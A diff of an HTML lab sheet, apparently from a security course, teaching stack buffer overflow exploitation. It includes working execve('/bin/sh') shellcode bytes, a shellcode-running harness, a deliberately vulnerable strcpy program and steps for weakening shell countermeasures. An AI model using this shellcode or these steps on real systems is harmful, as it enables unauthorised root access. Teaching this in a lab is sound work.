@@ -160,7 +160,7 @@ div.column{display: inline-block; vertical-align: top; width: 50%;}
 div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
 ul.task-list{list-style: none;}
 pre > code.sourceCode { white-space: pre; position: relative; }
-pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span { line-height: 1.25; }
 pre > code.sourceCode > span:empty { height: 1.2em; }
 .sourceCode { overflow: visible; }
 code.sourceCode > span { color: inherit; text-decoration: inherit; }
@@ -171,7 +171,7 @@ div.sourceCode { overflow: auto; }
 }
 @media print {
 pre > code.sourceCode { white-space: pre-wrap; }
-pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
 }
 pre.numberSource code
 { counter-reset: source-line 0; }
@@ -222,7 +222,6 @@ code span.st { color: #4070a0; }
 code span.va { color: #19177c; } 
 code span.vs { color: #4070a0; } 
 code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } 
-.display.math{display: block; text-align: center; margin: 0.5rem auto;}
 </style>
   <style>
 div.solutions {
@@ -238,10 +237,12 @@ font-weight: bold;
 margin-bottom: 1.5rem;
 text-align: center;
 }
+details[open] summary *.only-open {
+opacity: 0.1;
+}
 </style>
-  <!--[if lt IE 9]>
-    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
-  <![endif]-->
+<script data-external="1" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml-full.js" type="text/javascript">
+</script>
 </head>
 <body>
 <header id="title-block-header">
@@ -317,11 +318,11 @@ uses an x86-64 architecture.</p>
 </dd>
 </dl>
 <p>The preferred way of completing this lab is by using Vagrant (as
-outlined in Lab 1) to run the standard CITS3007 development environment
-image from VirtualBox. Within that VM, you have root access to the
-kernel, and all commands should complete successfully. If you use some
-other method, the commands <em>might</em> work, but it’s not
-guaranteed.</p>
+outlined in Lab 1) to run the standard CITS3007 standard development
+environment (SDE) image from VirtualBox. Within that VM, you have root
+access to the kernel, and all commands should complete successfully. If
+you use some other method, the commands <em>might</em> work, but it’s
+not guaranteed.</p>
 </div>
 <h2 id="setup">1. Setup</h2>
 <h3 id="countermeasures">1.1. Turning off countermeasures</h3>
@@ -391,11 +392,45 @@ countermeasure in <code>/bin/dash</code> makes our attack more
 difficult. Therefore, we will link <code>/bin/sh</code> to
 <code>zsh</code> instead, a shell which lacks such protection (though
 with more effort, the countermeasure in <code>/bin/dash</code> can be
-defeated – you might like to try doing so as a challenge task). Inside
-the development environment VM, install the <code>zsh</code> package
-with the command
-<code>sudo apt-get update &amp;&amp; sudo apt-get install -y zsh</code>,
-then run the following command to link <code>/bin/sh</code> to
+defeated – you might like to try doing so as a challenge task).</p>
+<div style="border: solid 2pt orange; background-color: hsl(22.35, 100%, 85%, 1); padding: 1em;">
+<div class="block-caption">
+<p>Take care!</p>
+</div>
+<p>Take care running the commands following this warning box.</p>
+<p>The command <code>sudo ln -sf /bin/zsh /bin/sh</code> overwrites
+whatever file is currently at <code>/bin/sh</code>, and replaces it with
+a symbolic link that points to <code>/bin/zsh</code>. If there
+<em>is</em> no file at <code>/bin/zsh</code>, then <code>/bin/sh</code>
+becomes a “broken link”; and since many Linux programs and libraries
+rely on <code>/bin/sh</code> existing, they’ll cease to work.</p>
+<p>So the <code>ln</code> command should only be run after
+<code>sudo apt-get install -y zsh</code> has completed successfully.
+It’s assumed in CITS3007 labs that you will read error messages produced
+by commands, and seek assistance if they don’t complete
+successfully.</p>
+<details>
+<summary>
+<span class="only-open"> …click for more </span>
+</summary>
+<p>If you <em>do</em> accidentally overwrite <code>/bin/sh</code>, then
+in the CITS3007 SDE, you can fix this by running
+<code>sudo ln -sf /usr/bin/dash /bin/sh</code>, which restores
+<code>/bin/sh</code> to its original state.</p>
+<p>Alternatively, to revert any alterations made in a VM, you can just
+destroy the current VM instance and create a new one. (This is the great
+advantage of virtualization technology – no matter what damage is done
+to a VM, it’s “cheap” to re-start from scratch.) You can do this by
+running (on your host laptop or other machine, in the directory where
+you Vagrantfile is located):</p>
+<pre><code>$ vagrant destroy --force
+$ vagrant up --provider=virtualbox</code></pre>
+</details>
+</div>
+<p>Inside the development environment VM, install the <code>zsh</code>
+package with the command
+<code>sudo apt-get update &amp;&amp; sudo apt-get install -y zsh</code>.
+Then run the following command to link <code>/bin/sh</code> to
 <code>zsh</code>:</p>
 <pre><code>$ sudo ln -sf /bin/zsh /bin/sh</code></pre>
 <p>You can confirm that you’ve done this correctly by running the
@@ -452,15 +487,15 @@ sequence of bytes – into a location on the stack, and try to convince
 the target program to execute it.</p>
 <p>Represented in C, a piece of shellcode might look like the
 following:</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode numberSource c numberLines"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1"></a><span class="co">// shellcode.c</span></span>
-<span id="cb7-2"><a href="#cb7-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
-<span id="cb7-3"><a href="#cb7-3"></a></span>
-<span id="cb7-4"><a href="#cb7-4"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
-<span id="cb7-5"><a href="#cb7-5"></a>  <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
-<span id="cb7-6"><a href="#cb7-6"></a>  name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
-<span id="cb7-7"><a href="#cb7-7"></a>  name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
-<span id="cb7-8"><a href="#cb7-8"></a>  execve<span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name<span class="op">,</span> NULL<span class="op">);</span></span>
-<span id="cb7-9"><a href="#cb7-9"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode numberSource c numberLines"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1"></a><span class="co">// shellcode.c</span></span>
+<span id="cb8-2"><a href="#cb8-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb8-3"><a href="#cb8-3"></a></span>
+<span id="cb8-4"><a href="#cb8-4"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb8-5"><a href="#cb8-5"></a>  <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
+<span id="cb8-6"><a href="#cb8-6"></a>  name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
+<span id="cb8-7"><a href="#cb8-7"></a>  name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
+<span id="cb8-8"><a href="#cb8-8"></a>  execve<span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb8-9"><a href="#cb8-9"></a><span class="op">}</span></span></code></pre></div>
 <p>Read about the Linux <code>execve</code> system call by typing <a href="https://man7.org/linux/man-pages/man2/execve.2.html"><code>man execve</code></a>;
 it allows us to execute a program from C code. The <code>name</code>
 array is effectively a list of pointers-to-<code>char</code>, with a
@@ -484,25 +519,25 @@ language</a>.<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref">
 equivalent for the above C code would be something like the following
 (which you are not required to understand, but is presented here for
 interest):</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode numberSource asm numberLines"><code class="sourceCode fasm"><span id="cb9-1"><a href="#cb9-1"></a><span class="co">; Store the command on stack</span></span>
-<span id="cb9-2"><a href="#cb9-2"></a><span class="bu">xor</span>  <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span></span>
-<span id="cb9-3"><a href="#cb9-3"></a><span class="bu">push</span> <span class="kw">eax</span></span>
-<span id="cb9-4"><a href="#cb9-4"></a><span class="bu">push</span> <span class="st">&quot;//sh&quot;</span></span>
-<span id="cb9-5"><a href="#cb9-5"></a><span class="bu">push</span> <span class="st">&quot;/bin&quot;</span></span>
-<span id="cb9-6"><a href="#cb9-6"></a><span class="bu">mov</span>  <span class="kw">ebx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ebx --&gt; &quot;/bin//sh&quot;: execve()&#39;s 1st argument</span></span>
-<span id="cb9-7"><a href="#cb9-7"></a></span>
-<span id="cb9-8"><a href="#cb9-8"></a><span class="co">; Construct the argument array argv[]</span></span>
-<span id="cb9-9"><a href="#cb9-9"></a><span class="bu">push</span> <span class="kw">eax</span> <span class="co">; argv[1] = 0</span></span>
-<span id="cb9-10"><a href="#cb9-10"></a><span class="bu">push</span> <span class="kw">ebx</span> <span class="co">; argv[0] --&gt; &quot;/bin//sh&quot;</span></span>
-<span id="cb9-11"><a href="#cb9-11"></a><span class="bu">mov</span> <span class="kw">ecx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ecx --&gt; argv[]: execve()&#39;s 2nd argument</span></span>
-<span id="cb9-12"><a href="#cb9-12"></a></span>
-<span id="cb9-13"><a href="#cb9-13"></a><span class="co">; For environment variable</span></span>
-<span id="cb9-14"><a href="#cb9-14"></a><span class="bu">xor</span> <span class="kw">edx</span><span class="op">,</span> <span class="kw">edx</span> <span class="co">; edx = 0: execve()&#39;s 3rd argument</span></span>
-<span id="cb9-15"><a href="#cb9-15"></a></span>
-<span id="cb9-16"><a href="#cb9-16"></a><span class="co">; Invoke execve()</span></span>
-<span id="cb9-17"><a href="#cb9-17"></a><span class="bu">xor</span> <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span> <span class="co">;</span></span>
-<span id="cb9-18"><a href="#cb9-18"></a><span class="bu">mov</span> <span class="kw">al</span><span class="op">,</span> <span class="bn">0x0b</span> <span class="co">; execve()&#39;s system call number</span></span>
-<span id="cb9-19"><a href="#cb9-19"></a><span class="bu">int</span> <span class="bn">0x80</span></span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode numberSource asm numberLines"><code class="sourceCode fasm"><span id="cb10-1"><a href="#cb10-1"></a><span class="co">; Store the command on stack</span></span>
+<span id="cb10-2"><a href="#cb10-2"></a><span class="bu">xor</span>  <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb10-3"><a href="#cb10-3"></a><span class="bu">push</span> <span class="kw">eax</span></span>
+<span id="cb10-4"><a href="#cb10-4"></a><span class="bu">push</span> <span class="st">&quot;//sh&quot;</span></span>
+<span id="cb10-5"><a href="#cb10-5"></a><span class="bu">push</span> <span class="st">&quot;/bin&quot;</span></span>
+<span id="cb10-6"><a href="#cb10-6"></a><span class="bu">mov</span>  <span class="kw">ebx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ebx --&gt; &quot;/bin//sh&quot;: execve()&#39;s 1st argument</span></span>
+<span id="cb10-7"><a href="#cb10-7"></a></span>
+<span id="cb10-8"><a href="#cb10-8"></a><span class="co">; Construct the argument array argv[]</span></span>
+<span id="cb10-9"><a href="#cb10-9"></a><span class="bu">push</span> <span class="kw">eax</span> <span class="co">; argv[1] = 0</span></span>
+<span id="cb10-10"><a href="#cb10-10"></a><span class="bu">push</span> <span class="kw">ebx</span> <span class="co">; argv[0] --&gt; &quot;/bin//sh&quot;</span></span>
+<span id="cb10-11"><a href="#cb10-11"></a><span class="bu">mov</span> <span class="kw">ecx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ecx --&gt; argv[]: execve()&#39;s 2nd argument</span></span>
+<span id="cb10-12"><a href="#cb10-12"></a></span>
+<span id="cb10-13"><a href="#cb10-13"></a><span class="co">; For environment variable</span></span>
+<span id="cb10-14"><a href="#cb10-14"></a><span class="bu">xor</span> <span class="kw">edx</span><span class="op">,</span> <span class="kw">edx</span> <span class="co">; edx = 0: execve()&#39;s 3rd argument</span></span>
+<span id="cb10-15"><a href="#cb10-15"></a></span>
+<span id="cb10-16"><a href="#cb10-16"></a><span class="co">; Invoke execve()</span></span>
+<span id="cb10-17"><a href="#cb10-17"></a><span class="bu">xor</span> <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span> <span class="co">;</span></span>
+<span id="cb10-18"><a href="#cb10-18"></a><span class="bu">mov</span> <span class="kw">al</span><span class="op">,</span> <span class="bn">0x0b</span> <span class="co">; execve()&#39;s system call number</span></span>
+<span id="cb10-19"><a href="#cb10-19"></a><span class="bu">int</span> <span class="bn">0x80</span></span></code></pre></div>
 <p>A brief explanation of the code (again, you’re not required to
 understand this in detail) is:</p>
 <ul>
@@ -576,43 +611,43 @@ corresponding assembly code:</p>
   17:    b0 0b                    mov    al,0xb
   19:    cd 80                    int    0x80</code></pre>
 <h3 id="invoking-the-shellcode">2.1. Invoking the shellcode</h3>
-<p>Download the file <a href="https://cits3007.github.io/labs/bufoverflow-code.zip"><code>bufoverflow-code.zip</code></a>
+<p>Download the file <a href="https://cits3007.arranstewart.io/labs/bufoverflow-code.zip"><code>bufoverflow-code.zip</code></a>
 into the VM (you can use the command
-<code>wget https://cits3007.github.io/labs/bufoverflow-code.zip</code>)
+<code>wget https://cits3007.arranstewart.io/labs/bufoverflow-code.zip</code>)
 and unzip it.</p>
 <p><code>cd</code> into the <code>shellcode</code> directory, and take a
 look at <code>call_shellcode.c</code> (reproduced below):</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
-<span id="cb11-2"><a href="#cb11-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
-<span id="cb11-3"><a href="#cb11-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
-<span id="cb11-4"><a href="#cb11-4"></a></span>
-<span id="cb11-5"><a href="#cb11-5"></a><span class="co">// Binary code for setuid(0)</span></span>
-<span id="cb11-6"><a href="#cb11-6"></a><span class="co">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span>
-<span id="cb11-7"><a href="#cb11-7"></a><span class="co">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span>
-<span id="cb11-8"><a href="#cb11-8"></a></span>
-<span id="cb11-9"><a href="#cb11-9"></a></span>
-<span id="cb11-10"><a href="#cb11-10"></a><span class="dt">const</span> <span class="dt">char</span> shellcode<span class="op">[]</span> <span class="op">=</span></span>
-<span id="cb11-11"><a href="#cb11-11"></a><span class="pp">#if __x86_64__</span></span>
-<span id="cb11-12"><a href="#cb11-12"></a>  <span class="st">&quot;</span><span class="sc">\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e</span><span class="st">&quot;</span></span>
-<span id="cb11-13"><a href="#cb11-13"></a>  <span class="st">&quot;</span><span class="sc">\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57</span><span class="st">&quot;</span></span>
-<span id="cb11-14"><a href="#cb11-14"></a>  <span class="st">&quot;</span><span class="sc">\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05</span><span class="st">&quot;</span></span>
-<span id="cb11-15"><a href="#cb11-15"></a><span class="pp">#else</span></span>
-<span id="cb11-16"><a href="#cb11-16"></a>  <span class="st">&quot;</span><span class="sc">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f</span><span class="st">&quot;</span></span>
-<span id="cb11-17"><a href="#cb11-17"></a>  <span class="st">&quot;</span><span class="sc">\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31</span><span class="st">&quot;</span></span>
-<span id="cb11-18"><a href="#cb11-18"></a>  <span class="st">&quot;</span><span class="sc">\xd2\x31\xc0\xb0\x0b\xcd\x80</span><span class="st">&quot;</span></span>
-<span id="cb11-19"><a href="#cb11-19"></a><span class="pp">#endif</span></span>
-<span id="cb11-20"><a href="#cb11-20"></a><span class="op">;</span></span>
-<span id="cb11-21"><a href="#cb11-21"></a></span>
-<span id="cb11-22"><a href="#cb11-22"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span></span>
-<span id="cb11-23"><a href="#cb11-23"></a><span class="op">{</span></span>
-<span id="cb11-24"><a href="#cb11-24"></a>   <span class="dt">char</span> code<span class="op">[</span><span class="dv">500</span><span class="op">];</span></span>
-<span id="cb11-25"><a href="#cb11-25"></a></span>
-<span id="cb11-26"><a href="#cb11-26"></a>   strcpy<span class="op">(</span>code<span class="op">,</span> shellcode<span class="op">);</span></span>
-<span id="cb11-27"><a href="#cb11-27"></a>   <span class="dt">int</span> <span class="op">(*</span>func<span class="op">)()</span> <span class="op">=</span> <span class="op">(</span><span class="dt">int</span><span class="op">(*)())</span>code<span class="op">;</span></span>
-<span id="cb11-28"><a href="#cb11-28"></a></span>
-<span id="cb11-29"><a href="#cb11-29"></a>   func<span class="op">();</span></span>
-<span id="cb11-30"><a href="#cb11-30"></a>   <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
-<span id="cb11-31"><a href="#cb11-31"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb12-2"><a href="#cb12-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb12-3"><a href="#cb12-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb12-4"><a href="#cb12-4"></a></span>
+<span id="cb12-5"><a href="#cb12-5"></a><span class="co">// Binary code for setuid(0)</span></span>
+<span id="cb12-6"><a href="#cb12-6"></a><span class="co">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span>
+<span id="cb12-7"><a href="#cb12-7"></a><span class="co">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span>
+<span id="cb12-8"><a href="#cb12-8"></a></span>
+<span id="cb12-9"><a href="#cb12-9"></a></span>
+<span id="cb12-10"><a href="#cb12-10"></a><span class="dt">const</span> <span class="dt">char</span> shellcode<span class="op">[]</span> <span class="op">=</span></span>
+<span id="cb12-11"><a href="#cb12-11"></a><span class="pp">#if __x86_64__</span></span>
+<span id="cb12-12"><a href="#cb12-12"></a>  <span class="st">&quot;</span><span class="sc">\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e</span><span class="st">&quot;</span></span>
+<span id="cb12-13"><a href="#cb12-13"></a>  <span class="st">&quot;</span><span class="sc">\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57</span><span class="st">&quot;</span></span>
+<span id="cb12-14"><a href="#cb12-14"></a>  <span class="st">&quot;</span><span class="sc">\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05</span><span class="st">&quot;</span></span>
+<span id="cb12-15"><a href="#cb12-15"></a><span class="pp">#else</span></span>
+<span id="cb12-16"><a href="#cb12-16"></a>  <span class="st">&quot;</span><span class="sc">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f</span><span class="st">&quot;</span></span>
+<span id="cb12-17"><a href="#cb12-17"></a>  <span class="st">&quot;</span><span class="sc">\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31</span><span class="st">&quot;</span></span>
+<span id="cb12-18"><a href="#cb12-18"></a>  <span class="st">&quot;</span><span class="sc">\xd2\x31\xc0\xb0\x0b\xcd\x80</span><span class="st">&quot;</span></span>
+<span id="cb12-19"><a href="#cb12-19"></a><span class="pp">#endif</span></span>
+<span id="cb12-20"><a href="#cb12-20"></a><span class="op">;</span></span>
+<span id="cb12-21"><a href="#cb12-21"></a></span>
+<span id="cb12-22"><a href="#cb12-22"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span></span>
+<span id="cb12-23"><a href="#cb12-23"></a><span class="op">{</span></span>
+<span id="cb12-24"><a href="#cb12-24"></a>   <span class="dt">char</span> code<span class="op">[</span><span class="dv">500</span><span class="op">];</span></span>
+<span id="cb12-25"><a href="#cb12-25"></a></span>
+<span id="cb12-26"><a href="#cb12-26"></a>   strcpy<span class="op">(</span>code<span class="op">,</span> shellcode<span class="op">);</span></span>
+<span id="cb12-27"><a href="#cb12-27"></a>   <span class="dt">int</span> <span class="op">(*</span>func<span class="op">)()</span> <span class="op">=</span> <span class="op">(</span><span class="dt">int</span><span class="op">(*)())</span>code<span class="op">;</span></span>
+<span id="cb12-28"><a href="#cb12-28"></a></span>
+<span id="cb12-29"><a href="#cb12-29"></a>   func<span class="op">();</span></span>
+<span id="cb12-30"><a href="#cb12-30"></a>   <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb12-31"><a href="#cb12-31"></a><span class="op">}</span></span></code></pre></div>
 <p>The purpose of this program is to demonstrate that our shellcode
 byte-sequence does indeed invoke the shell <code>/bin/sh</code>.</p>
 <p>The byte sequences are stored in the array <code>shellcode</code> –
@@ -677,39 +712,39 @@ zip file. This program has a buffer overflow vulnerability, and your job
 is to exploit this vulnerability and gain root privileges. The essential
 parts are shown below (some inessential functions have been
 omitted):</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
-<span id="cb12-2"><a href="#cb12-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
-<span id="cb12-3"><a href="#cb12-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
-<span id="cb12-4"><a href="#cb12-4"></a></span>
-<span id="cb12-5"><a href="#cb12-5"></a></span>
-<span id="cb12-6"><a href="#cb12-6"></a><span class="pp">#ifndef BUF_SIZE</span></span>
-<span id="cb12-7"><a href="#cb12-7"></a><span class="pp">#define BUF_SIZE 100</span></span>
-<span id="cb12-8"><a href="#cb12-8"></a><span class="pp">#endif</span></span>
-<span id="cb12-9"><a href="#cb12-9"></a></span>
-<span id="cb12-10"><a href="#cb12-10"></a><span class="dt">int</span> bof<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>str<span class="op">)</span> <span class="op">{</span></span>
-<span id="cb12-11"><a href="#cb12-11"></a>    <span class="dt">char</span> buffer<span class="op">[</span>BUF_SIZE<span class="op">];</span></span>
-<span id="cb12-12"><a href="#cb12-12"></a></span>
-<span id="cb12-13"><a href="#cb12-13"></a>    <span class="co">// The following statement has a buffer overflow problem</span></span>
-<span id="cb12-14"><a href="#cb12-14"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> str<span class="op">);</span></span>
-<span id="cb12-15"><a href="#cb12-15"></a></span>
-<span id="cb12-16"><a href="#cb12-16"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
-<span id="cb12-17"><a href="#cb12-17"></a><span class="op">}</span></span>
-<span id="cb12-18"><a href="#cb12-18"></a></span>
-<span id="cb12-19"><a href="#cb12-19"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span> <span class="op">{</span></span>
-<span id="cb12-20"><a href="#cb12-20"></a>    <span class="dt">char</span> str<span class="op">[</span><span class="dv">517</span><span class="op">];</span></span>
-<span id="cb12-21"><a href="#cb12-21"></a>    <span class="dt">FILE</span> <span class="op">*</span>badfile<span class="op">;</span></span>
-<span id="cb12-22"><a href="#cb12-22"></a></span>
-<span id="cb12-23"><a href="#cb12-23"></a>    badfile <span class="op">=</span> fopen<span class="op">(</span><span class="st">&quot;badfile&quot;</span><span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span></span>
-<span id="cb12-24"><a href="#cb12-24"></a>    <span class="cf">if</span> <span class="op">(!</span>badfile<span class="op">)</span> <span class="op">{</span></span>
-<span id="cb12-25"><a href="#cb12-25"></a>       perror<span class="op">(</span><span class="st">&quot;Opening badfile&quot;</span><span class="op">);</span> exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
-<span id="cb12-26"><a href="#cb12-26"></a>    <span class="op">}</span></span>
-<span id="cb12-27"><a href="#cb12-27"></a></span>
-<span id="cb12-28"><a href="#cb12-28"></a>    <span class="dt">int</span> length <span class="op">=</span> fread<span class="op">(</span>str<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">char</span><span class="op">),</span> <span class="dv">517</span><span class="op">,</span> badfile<span class="op">);</span></span>
-<span id="cb12-29"><a href="#cb12-29"></a>    printf<span class="op">(</span><span class="st">&quot;Input size: %d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> length<span class="op">);</span></span>
-<span id="cb12-30"><a href="#cb12-30"></a>    bof<span class="op">(</span>str<span class="op">);</span></span>
-<span id="cb12-31"><a href="#cb12-31"></a>    fprintf<span class="op">(</span>stdout<span class="op">,</span> <span class="st">&quot;==== Returned Properly ====</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
-<span id="cb12-32"><a href="#cb12-32"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
-<span id="cb12-33"><a href="#cb12-33"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb13-2"><a href="#cb13-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb13-3"><a href="#cb13-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb13-4"><a href="#cb13-4"></a></span>
+<span id="cb13-5"><a href="#cb13-5"></a></span>
+<span id="cb13-6"><a href="#cb13-6"></a><span class="pp">#ifndef BUF_SIZE</span></span>
+<span id="cb13-7"><a href="#cb13-7"></a><span class="pp">#define BUF_SIZE </span><span class="dv">100</span></span>
+<span id="cb13-8"><a href="#cb13-8"></a><span class="pp">#endif</span></span>
+<span id="cb13-9"><a href="#cb13-9"></a></span>
+<span id="cb13-10"><a href="#cb13-10"></a><span class="dt">int</span> bof<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>str<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-11"><a href="#cb13-11"></a>    <span class="dt">char</span> buffer<span class="op">[</span>BUF_SIZE<span class="op">];</span></span>
+<span id="cb13-12"><a href="#cb13-12"></a></span>
+<span id="cb13-13"><a href="#cb13-13"></a>    <span class="co">// The following statement has a buffer overflow problem</span></span>
+<span id="cb13-14"><a href="#cb13-14"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> str<span class="op">);</span></span>
+<span id="cb13-15"><a href="#cb13-15"></a></span>
+<span id="cb13-16"><a href="#cb13-16"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb13-17"><a href="#cb13-17"></a><span class="op">}</span></span>
+<span id="cb13-18"><a href="#cb13-18"></a></span>
+<span id="cb13-19"><a href="#cb13-19"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-20"><a href="#cb13-20"></a>    <span class="dt">char</span> str<span class="op">[</span><span class="dv">517</span><span class="op">];</span></span>
+<span id="cb13-21"><a href="#cb13-21"></a>    <span class="dt">FILE</span> <span class="op">*</span>badfile<span class="op">;</span></span>
+<span id="cb13-22"><a href="#cb13-22"></a></span>
+<span id="cb13-23"><a href="#cb13-23"></a>    badfile <span class="op">=</span> fopen<span class="op">(</span><span class="st">&quot;badfile&quot;</span><span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span></span>
+<span id="cb13-24"><a href="#cb13-24"></a>    <span class="cf">if</span> <span class="op">(!</span>badfile<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-25"><a href="#cb13-25"></a>       perror<span class="op">(</span><span class="st">&quot;Opening badfile&quot;</span><span class="op">);</span> exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb13-26"><a href="#cb13-26"></a>    <span class="op">}</span></span>
+<span id="cb13-27"><a href="#cb13-27"></a></span>
+<span id="cb13-28"><a href="#cb13-28"></a>    <span class="dt">int</span> length <span class="op">=</span> fread<span class="op">(</span>str<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">char</span><span class="op">),</span> <span class="dv">517</span><span class="op">,</span> badfile<span class="op">);</span></span>
+<span id="cb13-29"><a href="#cb13-29"></a>    printf<span class="op">(</span><span class="st">&quot;Input size: </span><span class="sc">%d\n</span><span class="st">&quot;</span><span class="op">,</span> length<span class="op">);</span></span>
+<span id="cb13-30"><a href="#cb13-30"></a>    bof<span class="op">(</span>str<span class="op">);</span></span>
+<span id="cb13-31"><a href="#cb13-31"></a>    fprintf<span class="op">(</span>stdout<span class="op">,</span> <span class="st">&quot;==== Returned Properly ====</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
